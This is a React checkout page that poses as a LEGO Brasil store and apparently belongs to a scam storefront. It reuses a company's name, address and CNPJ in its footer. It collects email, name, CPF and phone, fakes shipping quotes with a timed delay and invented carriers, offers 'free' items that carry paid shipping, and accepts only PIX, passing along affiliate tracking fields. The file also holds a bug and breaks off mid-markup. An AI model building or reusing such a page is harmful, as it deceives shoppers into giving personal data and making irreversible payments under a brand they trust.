"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Minus, Plus, Trash2, Loader2, Calendar, ChevronLeft, ChevronRight, X, Home, Shield } from "lucide-react"
import { CheckoutHeader } from "@/components/checkout-header"

import { createPixPayment, type PixPaymentData, maskCPF, maskPhone, validateEmail } from "@/lib/pix-api"
import { Edit2 } from "lucide-react"

interface CartItem {
  id: number
  name: string
  price: number
  originalPrice: number
  isFree: boolean
  image: string
  quantity: number
  description: string
}

export default function CheckoutPage() {
  const [cartItems, setCartItems] = useState<CartItem[]>([])
  const [showDeliveryOptions, setShowDeliveryOptions] = useState(false)
  const [deliveryMethod, setDeliveryMethod] = useState<"RECEBER" | "RETIRAR">("RECEBER")
  const [cep, setCep] = useState("")
  const [cepError, setCepError] = useState("")
  const [shippingOptions, setShippingOptions] = useState<any[]>([])
  const [selectedShipping, setSelectedShipping] = useState<any>(null)
  const [currentStep, setCurrentStep] = useState<
    "cart" | "email" | "personal" | "address" | "payment" | "processing" | "success"
  >("cart")
  const [email, setEmail] = useState("")
  const [emailError, setEmailError] = useState("")
  const [firstName, setFirstName] = useState("")
  const [lastName, setLastName] = useState("")
  const [cpf, setCpf] = useState("")
  const [phone, setPhone] = useState("")
  const [addressNumber, setAddressNumber] = useState("")
  const [complement, setComplement] = useState("")
  const [reference, setReference] = useState("")
  const [recipient, setRecipient] = useState("")
  const [saveInfo, setSaveInfo] = useState(true)
  const [receivePromotions, setReceivePromotions] = useState(false)
  const [addressData, setAddressData] = useState<any>(null)
  const [isCalculating, setIsCalculating] = useState(false)
  const [showShippingOptions, setShowShippingOptions] = useState(false)
  const [selectedStore, setSelectedStore] = useState<any>(null)
  const [showCalendar, setShowCalendar] = useState(false)
  const [selectedDate, setSelectedDate] = useState("")
  const [currentMonth, setCurrentMonth] = useState(new Date())
  const [showNotification, setShowNotification] = useState(false)
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string>("")

  const [isLoading, setIsLoading] = useState(false)

  const [totalPrice, setTotalPrice] = useState(0)
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    cpf: "",
    phone: "",
  })
  const [product, setProduct] = useState<any>(null)

  useEffect(() => {
    const checkoutData = localStorage.getItem("checkoutProduct")
    if (checkoutData) {
      const item = JSON.parse(checkoutData)
      setCartItems([
        {
          id: 1,
          name: item.name,
          price: item.finalPrice, // Usando finalPrice ao invés de price
          originalPrice: item.originalPrice,
          isFree: item.isFree,
          image: item.image,
          quantity: 1,
          description: "Produto fornecido e entregue por legobrasil",
        },
      ])
      setTotalPrice(item.finalPrice)
      setProduct(item)
    }
  }, [])

  const updateQuantity = (id: number, newQuantity: number) => {
    if (newQuantity < 1) return
    setCartItems((items) => items.map((item) => (item.id === id ? { ...item, quantity: newQuantity } : item)))
  }

  const removeItem = (id: number) => {
    setCartItems((items) => items.filter((item) => item.id !== id))
  }

  const calculateSubtotal = () => {
    return cartItems.reduce((total, item) => {
      return total + (item.isFree ? 0 : item.price * item.quantity)
    }, 0)
  }

  const calculateShipping = () => {
    if (selectedShipping) {
      return selectedShipping.price
    }
    return 0
  }

  const calculateTotal = () => {
    const subtotal = calculateSubtotal()
    const shipping = calculateShipping()
    const total = subtotal + shipping
    console.log("[v0] Cálculo do total:", { subtotal, shipping, total })
    return total
  }

  const formatCep = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 5) {
      return numbers
    }
    return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`
  }

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCep(e.target.value)
    setCep(formatted)
  }

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 3) return numbers
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 2) return numbers
    if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`
    if (numbers.length <= 11) return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const masked = maskCPF(e.target.value)
    setCpf(masked)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const masked = maskPhone(e.target.value)
    setPhone(masked)
  }

  const getAddressFromCep = async (cep: string) => {
    try {
      const cepNumbers = cep.replace(/\D/g, "")
      const response = await fetch(`https://viacep.com.br/ws/${cepNumbers}/json/`)
      const data = await response.json()

      if (data.erro) {
        throw new Error("CEP não encontrado")
      }

      return {
        street: data.logradouro,
        district: data.bairro,
        city: data.localidade,
        state: data.uf,
        fullAddress: `${data.logradouro}, ${data.bairro} - ${data.localidade} - ${data.uf}`,
      }
    } catch (error) {
      console.error("Erro ao buscar CEP:", error)
      return null
    }
  }

  const getBairroFromCep = async (cep: string) => {
    try {
      const cepNumbers = cep.replace(/\D/g, "")
      const response = await fetch(`https://viacep.com.br/ws/${cepNumbers}/json/`)
      const data = await response.json()

      if (data.erro) {
        throw new Error("CEP não encontrado")
      }

      return data.district || data.localidade || "Centro"
    } catch (error) {
      console.error("Erro ao buscar CEP:", error)
      return "Centro" // Fallback
    }
  }

  const handleCalculateShipping = async () => {
    if (!cep.trim()) {
      setCepError("Campo obrigatório.")
      return
    }

    setCepError("")
    setIsCalculating(true)
    setShowShippingOptions(false)
    setSelectedShipping(null)

    const address = await getAddressFromCep(cep)
    if (address) {
      setAddressData(address)
    }

    await new Promise((resolve) => setTimeout(resolve, 2000))

    setIsCalculating(false)

    const onlyFreeItems = hasOnlyFreeItems()

    if (deliveryMethod === "RETIRAR") {
      const bairro = address?.district || "Centro"
      const storeOption = {
        type: `Centro de Distribuição LEGO`,
        distance: "3.1km",
        address: `📍 ${bairro}`,
        price: onlyFreeItems ? 0 : 0,
      }
      setShippingOptions([storeOption])
    } else {
      if (onlyFreeItems) {
        setShippingOptions([{ type: "Correios Sedex", price: 25.91, days: "de 5-7 dias úteis" }])
      } else {
        setShippingOptions([
          { type: "Correios Pac", price: 0, days: "de 5-7 dias úteis." },
          { type: "JadLog Transportadora", price: 25.91, days: "Chegará amanhã." },
        ])
      }
    }

    setShowShippingOptions(true)
  }

  const handleStoreSelection = (store: any) => {
    setSelectedStore(store)
    setSelectedShipping(store)
    setShowCalendar(true)
  }

  const generateAvailableDates = () => {
    const dates = []
    const today = new Date()

    for (let i = 1; i <= 20; i++) {
      const date = new Date(today)
      date.setDate(today.getDate() + i)

      if (date.getDay() !== 0) {
        dates.push({
          date: date.toISOString().split("T")[0],
          display: date.toLocaleDateString("pt-BR", {
            weekday: "short",
            day: "2-digit",
            month: "2-digit",
          }),
        })
      }

      if (dates.length >= 14) break
    }

    return dates
  }

  const generateCalendar = () => {
    const year = currentMonth.getFullYear()
    const month = currentMonth.getMonth()

    const firstDay = new Date(year, month, 1)
    const lastDay = new Date(year, month + 1, 0)
    const startDate = new Date(firstDay)
    startDate.setDate(startDate.getDate() - firstDay.getDay())

    const days = []
    const today = new Date()

    for (let i = 0; i < 42; i++) {
      const date = new Date(startDate)
      date.setDate(startDate.getDate() + i)

      const isCurrentMonth = date.getMonth() === month
      const isPast = date < today
      const isToday = date.toDateString() === today.toDateString()
      const isSunday = date.getDay() === 0
      const isAvailable = isCurrentMonth && !isPast && !isSunday && !isToday

      days.push({
        date: date,
        day: date.getDate(),
        isCurrentMonth,
        isAvailable,
        dateString: date.toISOString().split("T")[0],
      })
    }

    return days
  }

  const navigateMonth = (direction: "prev" | "next") => {
    setCurrentMonth((prev) => {
      const newDate = new Date(prev)
      if (direction === "prev") {
        newDate.setMonth(prev.getMonth() - 1)
      } else {
        newDate.setMonth(prev.getMonth() + 1)
      }
      return newDate
    })
  }

  const formatMonthYear = (date: Date) => {
    return date.toLocaleDateString("pt-BR", { month: "long", year: "numeric" })
  }

  const handleContinueToEmail = () => {
    setCurrentStep("email")
  }

  const handleEmailSubmit = () => {
    if (!email.trim()) {
      setEmailError("E-mail é obrigatório")
      return
    }

    if (!validateEmail(email)) {
      setEmailError("E-mail deve ter um formato válido")
      return
    }

    setEmailError("")
    setCurrentStep("personal")
    setFormData({ ...formData, email: email })
  }

  const validateForm = (): boolean => {
    const errors: string[] = []

    // Validar email (obrigatório)
    if (!formData.email.trim()) {
      errors.push("E-mail é obrigatório")
    } else if (!validateEmail(formData.email)) {
      errors.push("E-mail deve ter um formato válido")
    }

    // Validar se PIX está selecionado
    if (!selectedPaymentMethod) {
      errors.push("Selecione um método de pagamento")
    }

    if (errors.length > 0) {
      alert("Erros encontrados:\n" + errors.join("\n"))
      return false
    }

    return true
  }

  const handlePaymentSubmit = async () => {
    if (selectedPaymentMethod !== "pix") {
      alert("Selecione PIX como método de pagamento")
      return
    }

    if (!validateForm()) {
      return
    }

    setIsLoading(true)

    try {
      const totalAmount = calculateTotal()
      console.log("[v0] Valor total com frete:", totalAmount)
      console.log("[v0] Valor em centavos:", Math.round(totalAmount * 100))

      const utmParams = product?.utmParams || {}

      const pixData: PixPaymentData = {
        amount: Math.round(totalAmount * 100), // Valor em centavos incluindo frete
        email: formData.email,
        name: `${formData.firstName} ${formData.lastName}`.trim(),
        phone: formData.phone,
        cpf: formData.cpf,
        description: `Compra LEGO - ${product?.name || "Produto"}`,
        utm_source: utmParams.utm_source,
        utm_medium: utmParams.utm_medium,
        utm_campaign: utmParams.utm_campaign,
        utm_content: utmParams.utm_content,
        utm_term: utmParams.utm_term,
        xcod: utmParams.xcod,
        sck: utmParams.sck,
        utm_id: utmParams.utm_id,
      }

      console.log("📤 Enviando dados PIX:", pixData)

      // Criar pagamento PIX via API
      const pixResponse = await createPixPayment(pixData)

      if (pixResponse.success && (pixResponse.qrcode || pixResponse.pixCopiaECola) && pixResponse.token) {
        const pixCode = pixResponse.qrcode || pixResponse.pixCopiaECola || ""

        // Salvar dados do PIX no localStorage para a página PIX
        localStorage.setItem(
          "pixPayment",
          JSON.stringify({
            qrcode: pixCode,
            token: pixResponse.token,
            amount: totalAmount, // Usar valor total com frete ao invés de totalPrice
            productName: product?.name || "Produto LEGO",
            email: formData.email,
            name: `${formData.firstName} ${formData.lastName}`.trim(),
          }),
        )

        console.log("🔄 Redirecionando para PIX...")
        // Redirecionar para página PIX
        window.location.href = "/pix"
      } else {
        throw new Error(pixResponse.error || "Erro ao gerar PIX")
      }
    } catch (error) {
      console.error("❌ Erro ao processar pagamento:", error)
      alert("Erro ao processar pagamento: " + (error as Error).message)
    } finally {
      setIsLoading(false)
    }
  }

  const hasOnlyFreeItems = () => {
    return cartItems.length > 0 && cartItems.every((item) => item.isFree)
  }

  const showTemporaryNotification = () => {
    setShowNotification(true)
    setTimeout(() => {
      setShowNotification(false)
    }, 3000)
  }

  const handleDeliveryMethodChange = (method: "RECEBER" | "RETIRAR") => {
    if (method === "RETIRAR" && hasOnlyFreeItems()) {
      showTemporaryNotification()
      return
    }

    setDeliveryMethod(method)
    setShowShippingOptions(false)
    setSelectedShipping(null)
    setShowCalendar(false)
    setSelectedStore(null)
    setSelectedDate("")
  }

  const handleEditDelivery = () => {
    setCurrentStep("address")
  }

  const handlePersonalDataSubmit = () => {
    if (!firstName.trim() || !lastName.trim() || !cpf.trim() || !phone.trim()) {
      alert("Por favor, preencha todos os campos obrigatórios.")
      return
    }
    setFormData({
      ...formData,
      firstName: firstName,
      lastName: lastName,
      cpf: cpf,
      phone: phone,
    })
    setCurrentStep("address")
  }

  const handleAddressSubmit = () => {
    if (deliveryMethod === "RECEBER" && !addressNumber.trim()) {
      alert("Por favor, preencha o número do endereço.")
      return
    }
    setCurrentStep("payment")
  }

  const handleFinalizePurchase = async () => {
    if (!selectedPaymentMethod) {
      showNotification("Selecione um método de pagamento")
      return
    }

    setIsLoading(true)

    try {
      const totalAmount = calculateTotal()
      console.log("[v0] Valor total calculado:", totalAmount)
      console.log("[v0] Valor em centavos:", Math.round(totalAmount * 100))

      const utmParams = product?.utmParams || {}

      const pixData: PixPaymentData = {
        amount: Math.round(totalAmount * 100), // Valor em centavos incluindo frete
        email: formData.email,
        name: `${formData.firstName} ${formData.lastName}`.trim(),
        phone: formData.phone,
        cpf: formData.cpf,
        description: `Compra LEGO - ${product?.name || "Produto"}`,
        utm_source: utmParams.utm_source,
        utm_medium: utmParams.utm_medium,
        utm_campaign: utmParams.utm_campaign,
        utm_content: utmParams.utm_content,
        utm_term: utmParams.utm_term,
        xcod: utmParams.xcod,
        sck: utmParams.sck,
        utm_id: utmParams.utm_id,
      }

      console.log("📤 Enviando dados PIX:", pixData)

      // Criar pagamento PIX via API
      const pixResponse = await createPixPayment(pixData)

      if (pixResponse.success && (pixResponse.qrcode || pixResponse.pixCopiaECola) && pixResponse.token) {
        const pixCode = pixResponse.qrcode || pixResponse.pixCopiaECola || ""

        // Salvar dados do PIX no localStorage para a página PIX
        localStorage.setItem(
          "pixPayment",
          JSON.stringify({
            qrcode: pixCode,
            token: pixResponse.token,
            amount: totalAmount, // Usar valor total com frete
            productName: product?.name || "Produto LEGO",
            email: formData.email,
            name: `${formData.firstName} ${formData.lastName}`.trim(),
          }),
        )

        console.log("🔄 Redirecionando para PIX...")
        // Redirecionar para página PIX
        window.location.href = "/pix"
      } else {
        throw new Error(pixResponse.error || "Erro ao gerar PIX")
      }
    } catch (error) {
      console.error("❌ Erro ao processar pagamento:", error)
      alert("Erro ao processar pagamento: " + (error as Error).message)
    } finally {
      setIsLoading(false)
    }
  }

  if (currentStep === "personal") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        <div className="max-w-md mx-auto bg-white min-h-screen transform transition-all duration-500 ease-in-out">
          <div className="p-4 border-b">
            <h1 className="text-xl font-semibold text-gray-900 text-center">Finalizar compra</h1>
          </div>

          <div className="p-4">
            {/* Etapa 1 - Dados pessoais */}
            <div className="flex items-center gap-3 mb-6">
              <div className="w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-semibold">
                1
              </div>
              <h2 className="text-lg font-medium text-gray-900">Dados pessoais</h2>
            </div>

            <p className="text-sm text-gray-600 mb-6">
              Solicitamos apenas as informações essenciais para a realização da compra.
            </p>

            <div className="space-y-4">
              <div>
                <Input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="E-mail"
                  className="w-full"
                  disabled
                />
              </div>

              <div>
                <Input
                  type="text"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  placeholder="Primeiro nome"
                  className="w-full"
                />
                {!firstName.trim() && <p className="text-xs text-red-500 mt-1">Campo obrigatório.</p>}
              </div>

              <div>
                <Input
                  type="text"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  placeholder="Último nome"
                  className="w-full"
                />
                {!lastName.trim() && <p className="text-xs text-red-500 mt-1">Campo obrigatório.</p>}
              </div>

              <Input
                type="text"
                placeholder="000.000.000-00"
                value={cpf}
                onChange={handleCpfChange}
                className="w-full"
              />

              <Input
                type="tel"
                placeholder="(11) 99999-9999"
                value={phone}
                onChange={handlePhoneChange}
                className="w-full"
              />

              <div className="space-y-3 pt-4">
                <label className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    checked={saveInfo}
                    onChange={(e) => setSaveInfo(e.target.checked)}
                    className="w-4 h-4 text-blue-600"
                  />
                  <span className="text-sm text-gray-700">Salvar minhas informações para próximas compras.</span>
                </label>

                <label className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    checked={receivePromotions}
                    onChange={(e) => setReceivePromotions(e.target.checked)}
                    className="w-4 h-4 text-blue-600"
                  />
                  <span className="text-sm text-gray-700">Quero receber e-mails com promoções.</span>
                </label>
              </div>
            </div>

            <Button
              onClick={handlePersonalDataSubmit}
              disabled={!firstName.trim() || !lastName.trim() || !cpf.trim() || !phone.trim()}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-full font-semibold mt-8"
            >
              Ir para a Entrega
            </Button>
          </div>
        </div>

        {/* Footer */}
        <div className="bg-gray-100 p-4 text-center text-sm text-gray-600">
          <p className="font-semibold text-orange-600 mb-2">FALE CONOSCO</p>
          <p className="mb-1">Telefone: (11) 3003-9030 - de segunda à sexta-feira, das 9h às 17h.</p>
          <p className="mb-4">
            M Shop Comercial LTDA | Rua Alexandre Dumas, 1630 - Chácara Santo Antônio - São Paulo/SP - CEP 04717-004 |
            CNPJ 01.490.698/0001-33 | Inscrição Estadual 115.012.872.118.
          </p>
          <div className="flex justify-center gap-2">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png?height=24&width=40&text=PIX"
              alt="PIX"
              className="h-6"
            />
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "address") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        <div className="max-w-md mx-auto bg-white min-h-screen transform transition-all duration-500 ease-in-out">
          <div className="p-4 border-b">
            <h1 className="text-xl font-semibold text-gray-900 text-center">Finalizar compra</h1>
          </div>

          <div className="p-4">
            {/* Etapa 1 - Dados pessoais (concluída) */}
            <div className="flex items-center gap-3 mb-4">
              <div className="w-8 h-8 bg-green-600 text-white rounded-full flex items-center justify-center text-sm">
                ✓
              </div>
              <div>
                <h2 className="text-sm font-medium text-gray-900">Dados pessoais</h2>
                <p className="text-xs text-gray-500">{email}</p>
                <p className="text-xs text-gray-500">
                  {firstName} {lastName}
                </p>
              </div>
            </div>

            {/* Etapa 2 - Entrega */}
            <div className="flex items-center gap-3 mb-6">
              <div className="w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-semibold">
                2
              </div>
              <h2 className="text-lg font-medium text-gray-900">Entrega</h2>
            </div>

            {/* Opções de entrega */}
            <div className="flex bg-gray-100 rounded-full p-1 mb-4">
              <button
                onClick={() => handleDeliveryMethodChange("RECEBER")}
                className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${
                  deliveryMethod === "RECEBER" ? "bg-blue-600 text-white" : "text-gray-600"
                }`}
              >
                Receber
              </button>
              <button
                onClick={() => handleDeliveryMethodChange("RETIRAR")}
                className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${
                  deliveryMethod === "RETIRAR" ? "bg-blue-600 text-white" : "text-gray-600"
                }`}
              >
                Retirar
              </button>
            </div>

            {/* CEP */}
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 mb-2">CEP</label>
              <div className="flex gap-2 mb-2">
                <Input
                  value={cep}
                  onChange={handleCepChange}
                  placeholder="00000-000"
                  maxLength={9}
                  className={`flex-1 ${cepError ? "border-red-500" : ""}`}
                />
                <Button
                  onClick={handleCalculateShipping}
                  disabled={isCalculating}
                  variant="outline"
                  className="text-blue-600 border-blue-600 hover:bg-blue-50 bg-transparent disabled:opacity-50"
                >
                  {isCalculating ? <Loader2 className="w-4 h-4 animate-spin" /> : "Calcular"}
                </Button>
              </div>
              {cepError && <p className="text-xs text-red-500 mb-2">{cepError}</p>}
            </div>

            {/* Opções de frete */}
            {showShippingOptions && shippingOptions.length > 0 && (
              <div className="mb-6">
                <h3 className="text-sm font-medium text-gray-700 mb-3">Forma de entrega</h3>
                <div className="space-y-2">
                  {shippingOptions.map((option, index) => (
                    <label
                      key={index}
                      className="flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:bg-gray-50"
                    >
                      <input
                        type="radio"
                        name="shipping"
                        checked={selectedShipping?.type === option.type}
                        onChange={() => setSelectedShipping(option)}
                        className="w-4 h-4 text-blue-600"
                      />
                      <div className="flex-1">
                        <p className="font-medium text-sm">{option.type}</p>
                        <p className="text-xs text-gray-600">{option.days || option.distance}</p>
                      </div>
                      <p className="font-semibold text-sm">
                        {option.price === 0 ? "Grátis" : `R$ ${option.price.toFixed(2).replace(".", ",")}`}
                      </p>
                    </label>
                  ))}
                </div>
              </div>
            )}

            {/* Endereço de entrega */}
            {addressData && deliveryMethod === "RECEBER" && (
              <div className="mb-6">
                <h3 className="text-sm font-medium text-gray-700 mb-3">Endereço de entrega</h3>
                <div className="flex items-center gap-2 mb-4">
                  <Home className="w-4 h-4 text-blue-600" />
                  <p className="text-sm text-gray-900">{addressData.fullAddress}</p>
                </div>

                <div className="space-y-4">
                  <div>
                    <Input
                      type="text"
                      value={addressNumber}
                      onChange={(e) => setAddressNumber(e.target.value)}
                      placeholder="Número"
                      className="w-full"
                    />
                  </div>

                  <div>
                    <Input
                      type="text"
                      value={complement}
                      onChange={(e) => setComplement(e.target.value)}
                      placeholder="Complemento e referência"
                      className="w-full"
                    />
                  </div>

                  <div>
                    <Input
                      type="text"
                      value={reference}
                      onChange={(e) => setReference(e.target.value)}
                      placeholder="Ponto de referência (Ex.: próximo ao parque Itu.)"
                      className="w-full"
                    />
                  </div>

                  <div>
                    <Input
                      type="text"
                      value={recipient}
                      onChange={(e) => setRecipient(e.target.value)}
                      placeholder="Destinatário"
                      className="w-full"
                    />
                  </div>
                </div>
              </div>
            )}

            <Button
              onClick={handleAddressSubmit}
              disabled={!selectedShipping || (deliveryMethod === "RECEBER" && !addressNumber.trim())}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-full font-semibold"
            >
              Ir para o pagamento
            </Button>

            {/* Seção 3 - Pagamento (preview) */}
            <div className="flex items-center gap-3 mt-8 pt-6 border-t">
              <div className="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-sm font-semibold">
                3
              </div>
              <div>
                <h2 className="text-sm font-medium text-gray-900">Pagamento</h2>
                <p className="text-xs text-gray-500">Aguardando o preenchimento dos dados.</p>
              </div>
            </div>

            {/* Resumo do pedido */}
            <div className="mt-8 pt-6 border-t">
              <h3 className="text-lg font-medium text-gray-900 mb-4">Resumo do pedido</h3>
              {/* Resumo será mostrado aqui */}
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="bg-gray-100 p-4 text-center text-sm text-gray-600">
          <p className="font-semibold text-orange-600 mb-2">FALE CONOSCO</p>
          <p className="mb-1">Telefone: (11) 3003-9030 - de segunda à sexta-feira, das 9h às 17h.</p>
          <p className="mb-4">
            M Shop Comercial LTDA | Rua Alexandre Dumas, 1630 - Chácara Santo Antônio - São Paulo/SP - CEP 04717-004 |
            CNPJ 01.490.698/0001-33 | Inscrição Estadual 115.012.872.118.
          </p>
          <div className="flex justify-center gap-2">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png?height=24&width=40&text=PIX"
              alt="PIX"
              className="h-6"
            />
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "payment") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        <div className="max-w-md mx-auto bg-white min-h-screen transform transition-all duration-500 ease-in-out">
          <div className="p-4 border-b">
            <h1 className="text-xl font-semibold text-gray-900">Finalizar compra</h1>
          </div>

          <div className="p-4">
            {/* Resumo das etapas anteriores */}
            {currentStep === "payment" && (
              <div className="space-y-6 mb-8">
                {/* Etapa 1 - Dados pessoais */}
                <div className="border-b pb-4">
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-semibold">
                        1
                      </div>
                      <h3 className="font-medium text-gray-900">Dados pessoais</h3>
                    </div>
                    <button onClick={() => setCurrentStep("personal")} className="text-blue-600 hover:text-blue-700">
                      <Edit2 className="w-4 h-4" />
                    </button>
                  </div>
                  <div className="ml-9 text-sm text-gray-600">
                    <p>{formData.email}</p>
                    <p>
                      {formData.firstName} {formData.lastName}
                    </p>
                    <p>{formData.phone}</p>
                  </div>
                </div>

                {/* Etapa 2 - Entrega */}
                <div className="border-b pb-4">
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-semibold">
                        2
                      </div>
                      <h3 className="font-medium text-gray-900">Entrega</h3>
                    </div>
                    <button onClick={handleEditDelivery} className="text-blue-600 hover:text-blue-700">
                      <Edit2 className="w-4 h-4" />
                    </button>
                  </div>
                  <div className="ml-9 text-sm text-gray-600">
                    <p>{deliveryMethod === "RECEBER" ? "Receber" : "Retirar"}</p>
                    {addressData && deliveryMethod === "RECEBER" && <p>{addressData.fullAddress}</p>}
                    {selectedShipping && (
                      <p>
                        {selectedShipping.type} -{" "}
                        {selectedShipping.price === 0
                          ? "Grátis"
                          : `R$ ${selectedShipping.price.toFixed(2).replace(".", ",")}`}
                      </p>
                    )}
                  </div>
                  <button
                    onClick={handleEditDelivery}
                    className="ml-9 mt-2 text-blue-600 text-sm border border-blue-600 px-3 py-1 rounded hover:bg-blue-50"
                  >
                    Alterar opções de entrega
                  </button>
                </div>
              </div>
            )}

            <div className="mb-6">
              <h3 className="text-sm font-medium text-gray-700 mb-3">Forma de pagamento</h3>

              {/* PIX - única opção disponível */}
              <button
                onClick={() => setSelectedPaymentMethod("pix")}
                className={`w-full border-2 rounded-lg p-4 transition-colors ${
                  selectedPaymentMethod === "pix"
                    ? "border-blue-600 bg-white"
                    : "border-gray-200 bg-white hover:border-gray-300"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span
                    className={`font-medium ${selectedPaymentMethod === "pix" ? "text-blue-600" : "text-gray-900"}`}
                  >
                    Pix
                  </span>
                  <div className="w-10 h-6 flex items-center justify-center">
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png"
                      alt="pix logo"
                      className="h-full object contain"
                    ></img>
                  </div>
                </div>
              </button>
            </div>

            {/* Resumo do pedido */}
            <div className="mb-6">
              <h3 className="text-lg font-medium text-gray-900 mb-4">Resumo do pedido</h3>

              {cartItems.map((item) => (
                <div key={item.id} className="flex gap-3 mb-4">
                  <div className="w-8 h-8 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-semibold">
                    1
                  </div>
                  <img
                    src={item.image || "/placeholder.svg"}
                    alt={item.name}
                    className="w-12 h-12 object-cover rounded"
                  />
                  <div className="flex-1">
                    <h4 className="text-sm font-medium text-gray-900">{item.name}</h4>
                    <p className="text-xs text-gray-500">Em até 6 dias úteis</p>
                  </div>
                  <div className="text-right">
                    {item.isFree ? (
                      <span className="text-sm font-semibold text-green-600">GRÁTIS</span>
                    ) : (
                      <span className="text-sm font-semibold">R$ {item.price.toFixed(2).replace(".", ",")}</span>
                    )}
                  </div>
                </div>
              ))}

              <div className="space-y-2 pt-4 border-t">
                <div className="flex justify-between text-sm">
                  <span>Subtotal</span>
                  <span>R$ {calculateSubtotal().toFixed(2).replace(".", ",")}</span>
                </div>
                {calculateShipping() > 0 && (
                  <div className="flex justify-between text-sm">
                    <span>Entrega</span>
                    <span>R$ {calculateShipping().toFixed(2).replace(".", ",")}</span>
                  </div>
                )}
                <div className="flex justify-between text-lg font-semibold pt-2 border-t">
                  <span>Total</span>
                  <span>R$ {calculateTotal().toFixed(2).replace(".", ",")}</span>
                </div>
              </div>
            </div>

            <Button
              onClick={handlePaymentSubmit}
              disabled={selectedPaymentMethod !== "pix" || isLoading}
              className={`w-full py-3 rounded-full font-semibold transition-colors ${
                selectedPaymentMethod === "pix" && !isLoading
                  ? "bg-blue-600 hover:bg-blue-700 text-white cursor-pointer"
                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center gap-2">
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Processando...</span>
                </div>
              ) : (
                <div className="flex items-center justify-center gap-2">
                  <span>Finalizar compra</span>
                </div>
              )}
            </Button>
          </div>
        </div>

        {/* Footer */}
        <div className="bg-gray-100 p-4 text-center text-sm text-gray-600">
          <p className="font-semibold text-orange-600 mb-2">FALE CONOSCO</p>
          <p className="mb-1">Telefone: (11) 3003-9030 - de segunda à sexta-feira, das 9h às 17h.</p>
          <p className="mb-4">
            M Shop Comercial LTDA | Rua Alexandre Dumas, 1630 - Chácara Santo Antônio - São Paulo/SP - CEP 04717-004 |
            CNPJ 01.490.698/0001-33 | Inscrição Estadual 115.012.872.118.
          </p>
          <div className="flex justify-center gap-2">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png?height=24&width=40&text=PIX"
              alt="PIX"
              className="h-6"
            />
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "processing") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        <div className="max-w-md mx-auto bg-white min-h-screen flex items-center justify-center">
